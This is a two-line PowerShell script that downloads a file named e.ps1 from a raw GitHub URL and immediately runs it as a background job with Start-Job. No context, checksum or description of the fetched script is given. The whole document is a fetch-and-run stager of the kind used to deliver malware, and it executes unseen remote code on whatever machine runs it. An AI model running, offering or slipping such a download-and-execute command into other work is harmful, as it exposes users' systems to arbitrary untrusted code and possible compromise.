Invoke-WebRequest -uri "https://raw.githubusercontent.com/Lyrimi/Testing/refs/heads/main/e.ps1" -OutFile ".\e.ps1"
Start-Job -F ".\e.ps1"
